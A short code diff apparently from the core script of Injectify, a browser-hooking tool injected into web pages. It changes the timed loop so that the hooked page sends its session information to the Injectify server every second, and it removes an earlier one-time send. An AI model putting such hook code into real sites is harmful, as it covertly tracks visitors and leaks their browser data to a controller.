@@ -160,7 +160,8 @@ window['injectify'] = class Injectify {
       listeners: {
         visibility: false,
         timed: {
-          active: false
+          active: false,
+          timer: null
         },
         devtools: false,
         websocket: {}
@@ -200,11 +201,6 @@ injectify.debugLog('core', 'warn', 'Injectify core.ts loaded! => https://github.
  * Window injection
  */
 if (!global.windowInjection) new WindowInjection()
-
-/**
- * Send session info to the Injectify server
- */
-injectify.session.send()
 
 /**
  * Replace the basic websocket handler with a feature-rich one
@@ -301,15 +297,9 @@ injectify.DevtoolsListener();
   } else {
     global.listeners.timed.active = true;
     (function sessionInfo() {
-      let currentState = JSON.stringify(injectify.session.info)
-      if (currentState !== global.listeners.timed.prevState) {
-        /**
-         * If the previous state was defined
-         */
-        if (global.listeners.timed.prevState) injectify.session.send()
-        global.listeners.timed.prevState = currentState
-      }
-      setTimeout(sessionInfo, 1000)
+      clearTimeout(global.listeners.timed.timer)
+      injectify.session.send()
+      global.listeners.timed.timer = setTimeout(sessionInfo, 1000)
     })()
   }
 })()
